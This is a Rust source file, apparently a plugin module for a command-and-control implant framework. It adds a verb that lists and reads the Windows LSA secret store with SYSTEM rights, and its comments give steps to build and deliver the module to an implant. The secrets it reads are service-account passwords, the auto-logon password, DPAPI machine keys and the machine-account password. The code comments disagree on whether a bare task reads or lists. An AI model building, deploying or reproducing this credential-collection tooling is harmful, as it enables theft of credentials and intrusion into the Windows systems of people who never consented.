//! The credential collection family's fourth module (architecture.md
//! Sec 5.4): `collect.lsasecrets`, the LSA policy's secret store --
//! one discrete collection technique whose halves stay honest about
//! what the act is: the survey that names the store's inventory and
//! the read that takes the values, both riding the task audit every
//! dispatched action already enters.
//!
//! The grammar gives one verb two actions -- `list` reports the
//! SYSTEM seat held or not and the store's inventory, one secret name
//! per row (the default: a bare task is a read), `read` takes the
//! secrets' current values, all of them or the one the trailing name
//! picks. The values come back through the LSA's own policy API, so
//! the system performs its own decryption and the module touches no
//! crypto; what the rows render is the value as text where it decodes
//! cleanly and as hex where it does not. The store carries the
//! service-account passwords (`_SC_` rows), the auto-logon password,
//! the DPAPI machine keys `dpapi` unseals under, and the
//! machine-account password -- the material the offline dumps of
//! `hives` mirror, read here in place. Both halves of the act answer
//! to the SYSTEM seat, and the refusal names the seat rather than
//! pretending the read ran.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load lsasecrets` task's content, then task
//! `collect.lsasecrets` like any compiled verb. A non-Windows build
//! compiles for the lane and refuses the verb at run time: the
//! technique has no secret store there.

mod arguments;
mod lsasecrets;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct LsaSecrets;

impl Plugin for LsaSecrets {
    fn name(&self) -> &'static str {
        "lsasecrets"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("collect.lsasecrets", lsasecrets_verb)]
    }
}

fn lsasecrets_verb(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the
/// secret store.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::List => list(),
        Action::Read => read(arguments.name.as_deref()),
    }
}

/// The technique has no secret store off Windows; the manifest's
/// targets keep the module off other loads, and this refusal keeps a
/// stray dispatch honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "collect.lsasecrets: the LSA secret store is a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

/// The survey read: the seat's row first, then the store's inventory
/// in the registry's own order -- the names two reads of one host
/// compare line by line.
#[cfg(windows)]
fn list() -> Result<String, String> {
    let key = lsasecrets::open_store()?;
    let names = lsasecrets::inventory(&key)?;
    let mut rows = vec![lsasecrets::seat_row()];
    if names.is_empty() {
        rows.push("the store carries no secrets".to_string());
    } else {
        rows.extend(names);
    }
    Ok(rows.join("\n"))
}

/// The read the operator names: every secret's current value, or the
/// one the trailing name picks. The seat's gate comes first so an
/// implant that is merely elevated refuses once, named; one secret
/// that refuses answers in its own row while the rest still read.
#[cfg(windows)]
fn read(named: Option<&str>) -> Result<String, String> {
    let key = lsasecrets::open_store()?;
    let names = match named {
        Some(one) => vec![one.to_string()],
        None => {
            let names = lsasecrets::inventory(&key)?;
            if names.is_empty() {
                return Ok("the store carries no secrets".to_string());
            }
            names
        }
    };
    let policy = lsasecrets::open_policy()?;
    let rows: Vec<String> = names
        .iter()
        .map(|name| lsasecrets::read_row(&policy, name))
        .collect();
    Ok(rows.join("\n"))
}

rod_plugin!(LsaSecrets);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list: a bare task reports the seat and
        // the inventory and pulls no value -- on a non-Windows build
        // it refuses, naming why.
        #[cfg(windows)]
        {
            let output = lsasecrets_verb("").expect("the read runs");
            assert!(output.contains("SYSTEM seat"), "{output}");
        }
        #[cfg(not(windows))]
        {
            let refusal = lsasecrets_verb("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(lsasecrets_verb("dump $MACHINE.ACC").is_err());
        assert!(lsasecrets_verb("list $MACHINE.ACC").is_err());
        assert!(lsasecrets_verb("name=$MACHINE.ACC").is_err());
    }
}
